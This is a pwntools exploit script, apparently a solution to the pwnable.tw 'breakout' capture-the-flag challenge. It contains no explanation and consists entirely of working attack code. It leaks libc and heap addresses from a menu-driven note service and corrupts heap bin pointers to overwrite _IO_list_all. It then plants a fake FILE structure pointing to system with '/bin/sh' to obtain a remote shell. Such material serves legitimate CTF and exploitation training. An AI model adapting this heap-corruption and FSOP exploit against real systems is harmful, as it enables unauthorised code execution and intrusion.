from pwn import *
def cmd(c):
	p.sendlineafter("> ",c)
def show():
	cmd("list")
def free(idx):
	cmd("punish")
	p.sendlineafter("Cell: ",str(idx))
def add(idx,size,note):
	cmd("note")
	p.sendlineafter("Cell: ",str(idx))
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Note: ",note)
def A(idx,size,note):
	cmd("note")
	p.sendlineafter("Cell: ",str(idx))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Note: ",note)
def nop(t=1):
	for x in range(t):
		cmd("nier")
	
#p=process("./breakout",env={"LD_PRELOAD":"./z.6"})
p=remote("chall.pwnable.tw",10400)
#binary=ELF("./breakout")
#p=remote("chall.pwnable.tw",10400)
#context.log_level='debug'
free(0)
nop(2)
show()
p.readuntil("Life imprisonment, horrible homicides with ice pic")
p.readuntil("Risk: ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7f809c9e5ba8-0x00007f809c621000)+0x1000
log.warning(hex(base))
libc=ELF("./z.6")
#libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc.address=base
heap_address=0x7ffff75301b0-0x00007ffff716c000+base-0x1000
add(1,0x48,p64(heap_address+1)*3+p64(0)+p64(heap_address)+p64(0x30)+p64(0)+p64(0))
show()
p.readuntil("Sentence: Life imprisonment, horrible homicides with ice pick")
p.readuntil("Prisoner: ")
data="\x00"+p.readuntil(" ")[:-1]
heap=u64(data.ljust(8,'\x00'))
log.warning(hex(heap))

add(8,0x88,"A")
add(9,0x28,"A")
add(8,0x89,"A")
add(2,0x28,"A")

add(3,0x88,"A")
add(4,0x88,"A")
add(3,0x89,"A")


main_arena=0x7ff7360cab20-0x00007ff735d07000+base

unsorted=0x7ff7360cab88-0x00007ff735d07000+base
smallbin=0x7ff7360cabe0-0x00007ff735d07000+base

add(1,0x48,p64(0x5557d20bd468-0x5557d20ab000+heap)+p64(libc.symbols['_IO_list_all'])+p64(smallbin)+p64(0)+p64(unsorted)+p64(0x100)+p64(0x5557d20bd590-0x5557d20ab000+heap+0x10)+p64(0))
add(0,0x100,p64(0)+p64(libc.symbols['_IO_list_all']-0x10))
add(5,0x88,"A")

fio=0x55555576a460-0x555555758000+heap
#context.log_level='debug'
add(1,0x48,p64(smallbin)*3+p64(0)+p64(libc.symbols['_IO_list_all'])+p64(0x200)+p64(fio)+p64(0))

fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake =fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])

add(0,0x200,fake)


p.interactive()
